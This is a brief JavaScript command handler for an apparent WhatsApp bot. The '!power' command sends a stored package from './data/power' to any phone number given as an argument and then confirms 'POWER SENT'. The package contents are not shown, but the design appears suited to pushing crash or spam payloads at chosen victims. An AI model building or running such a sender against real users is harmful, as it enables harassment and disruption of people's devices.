import { sendPackage }
from "../lib/package.js";

export default async function power(
sock,
from,
args,
m
){

const num = args[0];

if(!num){

return sock.sendMessage(from,{
text:"📌 example:\n!power 9379xxxx"
});

}

const jid =
num.replace(/\D/g,"")
+ "@s.whatsapp.net";

await sock.sendMessage(from,{
react:{
text:"⚡",
key:m.key
}
});

await sendPackage(
sock,
jid,
"./data/power",
1
);

await sock.sendMessage(from,{
text:"⚡ POWER SENT"
});

}